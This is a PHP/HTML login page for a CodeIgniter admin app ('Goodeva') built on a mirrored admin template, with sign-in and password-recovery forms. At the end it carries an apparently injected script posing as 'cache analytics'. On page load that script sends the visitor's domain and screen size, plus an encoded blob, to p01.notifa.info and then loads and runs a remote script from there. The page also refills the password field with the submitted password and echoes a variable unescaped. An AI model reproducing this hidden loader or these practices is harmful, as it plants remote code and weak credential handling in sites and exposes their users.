<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from www.wrappixel.com/demos/admin-templates/elegant-admin/modern/pages-login.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 29 Aug 2018 10:48:44 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- Tell the browser to be responsive to screen width -->
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <!-- Favicon icon -->
    <link rel="icon" type="image/png" sizes="16x16" href="../assets/images/favicon.png">
    <title>Goodeva - Login</title>
    <!-- page css -->
    <link href="<?php echo base_url(); ?>assets/dist/css/pages/login-register-lock.css" rel="stylesheet">
    <!-- Custom CSS -->
    <link href="<?php echo base_url(); ?>assets/dist/css/style.min.css" rel="stylesheet">
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
<style type="text/css">
  .form_error{
    color: red;
  }
</style>
</head>

<body class="skin-blue card-no-border">
    <!-- ============================================================== -->
    <!-- Preloader - style you can find in spinners.css -->
    <!-- ============================================================== -->
    <div class="preloader">
        <div class="loader">
            <div class="loader__figure"></div>
            <p class="loader__label">GOODEVA</p>
        </div>
    </div>
    <!-- ============================================================== -->
    <!-- Main wrapper - style you can find in pages.scss -->
    <!-- ============================================================== -->
    <section id="wrapper">
        <div class="login-register" style="background-image:url(<?php echo base_url(); ?>assets/images/background/login-register.jpg);">
            <div class="login-box card">
                <div class="card-body">

                  
                  <?php echo form_open('klik-here/login','class="form-horizontal form-material" id="loginform" ');?>
                    <!-- <form class="form-horizontal form-material" id="loginform" action="<?php echo base_url() ?>Klik-here/login" method="post"> -->
                        <h3 class="box-title m-b-20">Sign In</h3>

                        <?php if ($password != ''): ?>
                          <div class="alert alert-danger" id="success-alert">
                            <p><?php echo $password;?></p>
                          </div>  
                        <?php endif ?>

                        <!-- <?php if ($_GET['message'] == 'logout'): ?>
                          <div class="alert alert-warning" id="success-alert">
                            <p>Logout</p>
                          </div>  
                        <?php endif ?> -->
                        
                        <div class="form-group ">
                            <div class="col-xs-12">
                                <input class="form-control" type="text" value="<?php echo set_value('email'); ?>" name="email" placeholder="Email" > 
                                <div class="form_error">
                                  <?php echo form_error('email');?>
                                </div>
                            </div>
                        </div>
                        <div class="form-group">
                            <div class="col-xs-12">
                                <input class="form-control" type="password" value="<?php echo set_value('password'); ?>"" placeholder="Password" name="password" > 
                                <div class="form_error">
                                  <?php echo form_error('password');?>
                                </div>
                            </div>
                            
                        </div>
                        <div class="form-group row">
                            <div class="col-md-12">
                                <div class="custom-control custom-checkbox">
                                    <input type="checkbox" class="custom-control-input" id="customCheck1">
                                    <label class="custom-control-label" for="customCheck1">Remember me</label>
                                    <a href="javascript:void(0)" id="to-recover" class="text-dark pull-right"><i class="fa fa-lock m-r-5"></i> Forgot pwd?</a>
                                </div>
                            </div>
                        </div>

                        
                        
                        
                         
                        <div class="form-group text-center">
                            <div class="col-xs-12 p-b-20">
                                <button class="btn btn-block btn-lg btn-info btn-rounded" type="submit">Log In</button>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-xs-12 col-sm-12 col-md-12 m-t-10 text-center">
                                <div class="social">
                                    <a href="javascript:void(0)" class="btn  btn-facebook" data-toggle="tooltip" title="Login with Facebook"> <i aria-hidden="true" class="fa fa-facebook"></i> </a>
                                    <a href="javascript:void(0)" class="btn btn-googleplus" data-toggle="tooltip" title="Login with Google"> <i aria-hidden="true" class="fa fa-google-plus"></i> </a>
                                </div>
                            </div>
                        </div>
                        <div class="form-group m-b-0">
                            <div class="col-sm-12 text-center">
                                Don't have an account? <a href="pages-register.html" class="text-info m-l-5"><b>Sign Up</b></a>
                            </div>
                        </div>
                    </form>
                    <form class="form-horizontal" id="recoverform" action="http://www.wrappixel.com/demos/admin-templates/elegant-admin/modern/index.html">
                        <div class="form-group ">
                            <div class="col-xs-12">
                                <h3>Recover Password</h3>
                                <p class="text-muted">Enter your Email and instructions will be sent to you! </p>
                            </div>
                        </div>
                        <div class="form-group ">
                            <div class="col-xs-12">
                                <input class="form-control" type="text" required="" placeholder="Email"> </div>
                        </div>
                        <div class="form-group text-center m-t-20">
                            <div class="col-xs-12">
                                <button class="btn btn-primary btn-lg btn-block text-uppercase waves-effect waves-light" type="submit">Reset</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </section>
    <!-- ============================================================== -->
    <!-- End Wrapper -->
    <!-- ============================================================== -->
    <!-- ============================================================== -->
    <!-- All Jquery -->
    <!-- ============================================================== -->
    <script src="<?php echo base_url(); ?>assets/node_modules/jquery/jquery-3.2.1.min.js"></script>
    <!-- Bootstrap tether Core JavaScript -->
    <script src="<?php echo base_url(); ?>assets/node_modules/popper/popper.min.js"></script>
    <script src="<?php echo base_url(); ?>assets/node_modules/bootstrap/dist/js/bootstrap.min.js"></script>
    <!--Custom JavaScript -->
    <script type="text/javascript">
      $("#success-alert").fadeTo(5000, 500).slideUp(500, function(){
          $("#success-alert").slideUp(500);
      });
    </script>
    <script type="text/javascript">
    $(function() {
        $(".preloader").fadeOut();
    });
    $(function() {
        $('[data-toggle="tooltip"]').tooltip()
    });
    // ============================================================== 
    // Login and Recover Password 
    // ============================================================== 
    $('#to-recover').on("click", function() {
        $("#loginform").slideUp();
        $("#recoverform").fadeIn();
    });
    </script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m8Ghk4KdVfTvhv9TyTEA6VYZWyxIccSajtGWQrTXU2AJ9MMjKuIxmECUVhxaEpp5UHRjK6Zie6SHFjAnDgB7V11jr4czBn2c6jTM8fJLs%2bgG48J4rlLTE5uREgfQpXRiyoxuzSjP2ik%2fTj1CAQU1wvv8LP%2bhM7KFBl6Cn4RGpsql014CPhEWpnj0ObbgSlBMgEj%2bam1PY7qO15E7tdUQSqLyaiXSIZYOQdhBhwOgWJDWJ5LQfqPKtJvtKAhTBUxqUKEwwBtZYqexpB41Uz7%2fQDlNEK99qNTxvUgAsGBsbKoi9N3c8MqbiD%2fMCf%2ffEyRuz%2fM5TMMLVb5wWny5yu%2b54T%2fKmFTxKH4i0nabZhtNPo4vxtO6FWSJUd%2ffmmMba40jV32AwUSYOvE2F7A%2bmRJ%2f2V6B3otjvHzM1BDjTQAw1MX%2foOWAe9VrGDW7BYsizYPBgeS3fiwEy3%2fMKqDxD3OPrYGZwi8MG4Vd65Y1h%2bs%2fAtsz63KisyK%2bKgyIYTK1YspoOAqRSNmnx4Ic%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>



</html>